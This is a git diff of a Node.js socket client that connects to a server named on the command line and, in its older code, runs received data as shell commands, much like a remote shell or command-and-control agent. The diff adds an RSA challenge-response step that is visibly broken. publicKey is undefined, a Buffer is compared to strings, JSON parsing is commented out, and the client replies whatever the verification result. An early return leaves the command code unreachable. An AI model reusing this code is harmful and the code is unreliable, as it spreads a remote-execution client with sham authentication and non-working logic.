@@ -3,6 +3,7 @@ const { exec } = require("child_process");
 const { EventEmitter } = require("stream");
 const { register, connect } = require("./setup");
 const socket = new Socket();
+const crypto = require("crypto");
 
 // take port and host from command line arguments
 const port = parseInt(process.argv[2]) || 3000;
@@ -10,13 +11,57 @@ const host = process.argv[3] || "localhost";
 
 socket.connect(port, host, () => {
   console.log("Connected to server");
-  //register(socket);
-  connect(socket);
+  register(socket);
+
+  setTimeout(() => {
+    connect(socket);
+  }, 3000);
 });
 
 socket.on("data", (data) => {
-  console.log("Received:", data.toString());
-  let command = data.toString();
+  console.log("Received:", data.toString(), typeof data);
+  let command = data;
+  if (command === "exit") {
+    socket.end();
+    process.exit();
+  }
+
+  try {
+    // command = JSON.parse(command);
+    if (command && command?.type === "send_challenge") {
+      console.log("Challenge received");
+      const challenge = command.data.challenge;
+      let encryptedChallenge = Buffer.from(challenge, "hex");
+      console.log("Encrypted challenge:", encryptedChallenge);
+      console.log("Challenge:", challenge);
+
+      const isVerified = crypto.verify(
+        "sha256",
+        Buffer.from(challenge),
+        {
+          key: publicKey,
+          padding: crypto.constants.RSA_PKCS1_PSS_PADDING,
+        },
+        encryptedChallenge,
+      );
+
+      console.log("Is verified:", isVerified);
+      // Respond to challenge
+      socket.write(
+        JSON.stringify({
+          type: "respond_challenge",
+          data: {
+            response: challenge,
+          },
+        }),
+      );
+    }
+  } catch (error) {
+    console.log("Error parsing JSON");
+  }
+
+  return;
+
   let currentDirectory = process.cwd();
   if (command.startsWith("cd")) {
     console.log("Changing directory");
